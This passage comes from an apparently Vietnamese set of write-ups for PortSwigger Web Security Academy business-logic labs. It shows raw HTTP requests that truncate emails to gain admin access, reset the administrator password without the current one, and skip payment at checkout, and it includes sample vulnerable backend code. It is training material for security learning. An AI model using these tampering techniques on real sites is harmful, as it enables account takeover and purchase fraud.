+<p><img alt="image.png" src="image%2021.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi lại sản phẩm nhưng với quantity dương để cộng lên 1 số dương nhưng vẫn nhỏ hơn số tiền user hiện có. Chỗ này, thì vì mỗi lần chỉ cộng dồn 1 chút nên mỗi lần cộng thêm sẽ bị trừ đi ⇒ dù tổng thể lớn hơn giới hạn nhưng không bị tràn và thành số âm nữa bởi nó bị trừ dần rồi. Dưới đây là kết quả để tạo ra số tiền dương nhỏ hơn</p>
+<ul>
+<li>
+<p>Request cộng thêm sản phẩm khác</p>
+<p><img alt="image.png" src="image%2022.png" /></p>
+</li>
+<li>
+<p>Kết quả</p>
+<p><img alt="image.png" src="image%2023.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện mua hàng với giá tiền trên thành công. Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2024.png" /></p>
+</li>
+</ul>
+<h1 id="lab-inconsistent-handling-of-exceptional-input"><strong>Lab: Inconsistent handling of exceptional input</strong><a class="headerlink" href="#lab-inconsistent-handling-of-exceptional-input" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input">Lab: Inconsistent handling of exceptional input | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện đăng ký với email dài với domain của attacker như sau:</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">register</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">a3c00110487880084196e5e00d30000</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">dFXUfdVKaugOLgQTnXFHBLllDVKeUvfW</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">537</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a3c00110487880084196e5e00d30000.web-security-academy.net</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a3c00110487880084196e5e00d30000.web-security-academy.net/register</span>
+<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">navigate</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">User</span><span class="o">:</span><span class="w"> </span><span class="o">?</span><span class="mf">1</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="nx">csrf</span><span class="o">=</span><span class="nx">YPr32SXu50xnZOrbCwJpZdt6xUq0PmfO</span><span class="o">&amp;</span><span class="nx">username</span><span class="o">=</span><span class="nx">dat1</span><span class="o">&amp;</span><span class="nx">email</span><span class="o">=</span><span class="p">&lt;</span><span class="nt">aaa</span><span class="p">.</span><span class="na">..</span><span class="p">&gt;</span><span class="err">@</span><span class="nx">exploit</span><span class="o">-</span><span class="mf">0</span><span class="nx">ac0004f04a0881784936d13019e0042</span><span class="p">.</span><span class="nx">exploit</span><span class="o">-</span><span class="nx">server</span><span class="p">.</span><span class="nx">net</span><span class="o">&amp;</span><span class="nx">password</span><span class="o">=</span><span class="mf">1</span>
+</code></pre></div>
+<p><img alt="image.png" src="image%2025.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Đăng nhập vào tài khoản vừa đăng ký thành công. Điều hướng đến chức năng <code>My account</code> , nhận thấy email hiện ra không còn phần đuôi và chỉ hiện đúng 255 ký tự</p>
+<p><img alt="image.png" src="image%2026.png" /></p>
+</li>
+<li>
+<p>Trong quá trình fuzzing, mình thấy có path <code>/admin</code> nhưng chỉ có thể truy cập từ user thuộc <code>DontWannaCry</code> ⇒ có thể họ sẽ kiểm tra user  bằng email</p>
+</li>
+<li>
+<p>Thực hiện đăng ký account khác với email như sau:</p>
+<ul>
+<li>
+<p>Email</p>
+<div class="highlight"><pre><span></span><code><span class="nx">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><span class="err">@</span><span class="nx">dontwannacry</span><span class="p">.</span><span class="nx">com</span>
+</code></pre></div>
+</li>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">register</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">a3c00110487880084196e5e00d30000</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">C7Tf2C99E8cz9SPou9dvBOznU36Haw6j</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">385</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a3c00110487880084196e5e00d30000.web-security-academy.net</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a3c00110487880084196e5e00d30000.web-security-academy.net/register</span>
+<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">navigate</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">User</span><span class="o">:</span><span class="w"> </span><span class="o">?</span><span class="mf">1</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="nx">csrf</span><span class="o">=</span><span class="nx">BnkENiKhBTRBxuMrGcBgyLaawL5o035j</span><span class="o">&amp;</span><span class="nx">username</span><span class="o">=</span><span class="nx">dat12</span><span class="o">&amp;</span><span class="nx">email</span><span class="o">=</span><span class="nx">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><span class="err">@</span><span class="nx">dontwannacry</span><span class="p">.</span><span class="nx">com</span><span class="p">.</span><span class="nx">exploit</span><span class="o">-</span><span class="mf">0</span><span class="nx">ac0004f04a0881784936d13019e0042</span><span class="p">.</span><span class="nx">exploit</span><span class="o">-</span><span class="nx">server</span><span class="p">.</span><span class="nx">net</span><span class="o">&amp;</span><span class="nx">password</span><span class="o">=</span><span class="mf">1</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Sau đó, đăng ký thành công và login vào tài khoản đã đăng ký. Điều hướng đến chức năng <code>My account</code> . Quan sát thấy có admin panel</p>
+<p><img alt="image.png" src="image%2027.png" /></p>
+</li>
+<li>
+<p>Thực hiện truy cập, xóa thành công user <code>Carlos</code> . Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2028.png" /></p>
+</li>
+</ul>
+<h1 id="lab-weak-isolation-on-dual-use-endpoint"><strong>Lab: Weak isolation on dual-use endpoint</strong><a class="headerlink" href="#lab-weak-isolation-on-dual-use-endpoint" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint">Lab: Weak isolation on dual-use endpoint | Web Security Academy</a></p>
+<ul>
+<li>Login vào tài khoản <code>wiener:peter</code></li>
+<li>
+<p>Điều hướng đến chức năng <code>My account</code></p>
+<p><img alt="image.png" src="image%2029.png" /></p>
+</li>
+<li>
+<p>Tại đây, thực hiện thay đổi mật khẩu.</p>
+<p><img alt="image.png" src="image%2030.png" /></p>
+</li>
+<li>
+<p>Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API <code>POST /my-account/change-password</code> . Thực hiện xóa param <code>current-password</code>  và đổi username thành <code>administrator</code>  Chuyển tiếp request</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">my</span><span class="o">-</span><span class="nx">account</span><span class="o">/</span><span class="nx">change</span><span class="o">-</span><span class="nx">password</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">a0e00dc04c2f64f8073210c00ef0073</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">bmiHAkJ2MIfdp2UiZfB07Z9Kuujbxskg</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">126</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a0e00dc04c2f64f8073210c00ef0073.web-security-academy.net</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a0e00dc04c2f64f8073210c00ef0073.web-security-academy.net/my-account?id=wiener</span>
+<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">navigate</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">User</span><span class="o">:</span><span class="w"> </span><span class="o">?</span><span class="mf">1</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="nx">csrf</span><span class="o">=</span><span class="nx">hNSl6EIwUgsorHTXXy5t5l1gooQ5QHjx</span><span class="o">&amp;</span><span class="nx">username</span><span class="o">=</span><span class="nx">administrator</span><span class="o">&amp;</span><span class="ow">new</span><span class="o">-</span><span class="nx">password</span><span class="o">-</span><span class="mf">1</span><span class="o">=</span><span class="nx">peter</span><span class="o">&amp;</span><span class="ow">new</span><span class="o">-</span><span class="nx">password</span><span class="o">-</span><span class="mf">2</span><span class="o">=</span><span class="nx">peter</span>
+</code></pre></div>
+<p><img alt="image.png" src="image%2031.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện login tài khoản <code>administrator</code> với mật khẩu update thành công. Thực hiện xóa user <code>carlos</code> và hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2032.png" /></p>
+</li>
+<li>
+<p>Code phía backend có thể như này</p>
+<div class="highlight"><pre><span></span><code><span class="nx">def</span><span class="w"> </span><span class="nx">change_password_request</span><span class="p">(</span><span class="nx">username</span><span class="p">,</span><span class="w"> </span><span class="nx">current_password</span><span class="p">,</span><span class="w"> </span><span class="nx">new_password</span><span class="p">)</span><span class="o">:</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">current_password</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">None</span><span class="o">:</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">verify_password</span><span class="p">(</span><span class="nx">logged_in_user</span><span class="p">,</span><span class="w"> </span><span class="nx">current_password</span><span class="p">)</span><span class="o">:</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s2">&quot;Mật khẩu hiện tại không đúng!&quot;</span>
+
+<span class="w">    </span><span class="nx">update_password_in_db</span><span class="p">(</span><span class="nx">username</span><span class="p">,</span><span class="w"> </span><span class="nx">new_password</span><span class="p">)</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="s2">&quot;Thay đổi mật khẩu thành công!&quot;</span>
+</code></pre></div>
+</li>
+</ul>
+<h1 id="lab-insufficient-workflow-validation"><strong>Lab: Insufficient workflow validation</strong><a class="headerlink" href="#lab-insufficient-workflow-validation" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation">Lab: Insufficient workflow validation | Web Security Academy</a></p>
+<ul>
+<li>Thực hiện login vào tài khoản <code>wiener:peter</code></li>
+<li>
+<p>Thực hiện thêm sản phẩm <code>Lightweight "l33t" Leather Jacket</code> vào giỏ hàng</p>
+<p><img alt="image.png" src="image%2033.png" /></p>
+</li>
+<li>
+<p>Thực hiện gửi request sau. Quan sát thấy đơn hàng được mua thành công mà không bị trừ tiền</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">GET</span><span class="w"> </span><span class="o">/</span><span class="nx">cart</span><span class="o">/</span><span class="nx">order</span><span class="o">-</span><span class="nx">confirmation</span><span class="o">?</span><span class="nx">order</span><span class="o">-</span><span class="nx">confirmed</span><span class="o">=</span><span class="kc">true</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">aad004e04cd2315815007c000ef006b</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">hW1BgqUevIezMNAfnyQefx8NtyQONCBR</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0aad004e04cd2315815007c000ef006b.web-security-academy.net/cart</span>
+<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">navigate</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">User</span><span class="o">:</span><span class="w"> </span><span class="o">?</span><span class="mf">1</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+</code></pre></div>
+<p><img alt="image.png" src="image%2034.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Code phía backend xử lý như sau sẽ bị lỗ hổng này</p>
+<div class="highlight"><pre><span></span><code><span class="err">@</span><span class="nx">app</span><span class="p">.</span><span class="nx">route</span><span class="p">(</span><span class="s1">&#39;/cart/checkout&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="nx">def</span><span class="w"> </span><span class="nx">checkout</span><span class="p">()</span><span class="o">:</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">user</span><span class="p">.</span><span class="nx">has_enough_money</span><span class="p">(</span><span class="nx">total_price</span><span class="p">)</span><span class="o">:</span>
+<span class="w">        </span><span class="nx">user</span><span class="p">.</span><span class="nx">subtract_money</span><span class="p">(</span><span class="nx">total_price</span><span class="p">)</span>
+<span class="w">        </span><span class="err">#</span><span class="w"> </span><span class="nx">Sau</span><span class="w"> </span><span class="nx">khi</span><span class="w"> </span><span class="nx">trừ</span><span class="w"> </span><span class="nx">tiền</span><span class="p">,</span><span class="w"> </span><span class="nx">hệ</span><span class="w"> </span><span class="nx">thống</span><span class="w"> </span><span class="nx">điều</span><span class="w"> </span><span class="nx">hướng</span><span class="w"> </span><span class="nx">bạn</span><span class="w"> </span><span class="nx">sang</span><span class="w"> </span><span class="nx">trang</span><span class="w"> </span><span class="nx">xác</span><span class="w"> </span><span class="nx">nhận</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">redirect</span><span class="p">(</span><span class="s1">&#39;/cart/order-confirmation&#39;</span><span class="p">)</span>
+
+<span class="err">@</span><span class="nx">app</span><span class="p">.</span><span class="nx">route</span><span class="p">(</span><span class="s1">&#39;/cart/order-confirmation&#39;</span><span class="p">)</span>
+<span class="nx">def</span><span class="w"> </span><span class="nx">confirm_order</span><span class="p">()</span><span class="o">:</span>
+<span class="w">    </span><span class="nx">user_cart</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">get_current_cart</span><span class="p">(</span><span class="nx">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">])</span>
+<span class="w">    </span><span class="nx">process_shipping</span><span class="p">(</span><span class="nx">user_cart</span><span class="p">)</span><span class="w"> </span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="s2">&quot;Chúc mừng! Bạn đã mua hàng thành công.&quot;</span>
+</code></pre></div>
+</li>
+</ul>
+<h1 id="lab-authentication-bypass-via-flawed-state-machine"><strong>Lab: Authentication bypass via flawed state machine</strong><a class="headerlink" href="#lab-authentication-bypass-via-flawed-state-machine" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine">Lab: Authentication bypass via flawed state machine | Web Security Academy</a></p>
+<ul>
+<li>Thực hiện login vào tài khoản <code>wiener:peter</code></li>
+<li>
+<p>Thực hiện Intercept Response của Request gửi tới API  <code>POST /login</code> như sau:</p>
+<p><img alt="image.png" src="image%2035.png" /></p>
+</li>
+<li>
+<p>Thực hiện chỉnh sửa header <code>Location</code> của response của request trên như sau</p>
+<ul>
+<li>
+<p>Response</p>
+<div class="highlight"><pre><span></span><code><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span><span class="w"> </span><span class="mf">302</span><span class="w"> </span><span class="nx">Found</span>
+<span class="nx">Location</span><span class="o">:</span><span class="w"> </span><span class="err">/admin</span>
